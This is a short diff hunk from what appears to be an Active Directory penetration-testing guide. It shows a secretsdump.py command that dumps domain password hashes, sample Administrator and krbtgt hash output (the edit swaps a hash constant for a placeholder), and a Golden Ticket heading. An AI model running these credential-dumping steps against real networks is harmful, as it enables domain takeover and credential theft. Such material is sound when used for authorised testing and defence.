@@ -144,8 +144,8 @@ entire domain or forest.
     secretsdump.py corp.local/user:password@10.10.10.10
 
     # Expected output:
-    # Administrator:500:aad3b435b51404eeaad3b435b51404ee:<LM_HASH>:::
-    # krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH>:::
+    # Administrator:500:<LM_HASH_EMPTY>:<LM_HASH>:::
+    # krbtgt:502:<LM_HASH_EMPTY>:<NTLM_HASH>:::
 
 **Golden Ticket (with KRBTGT hash):**
 
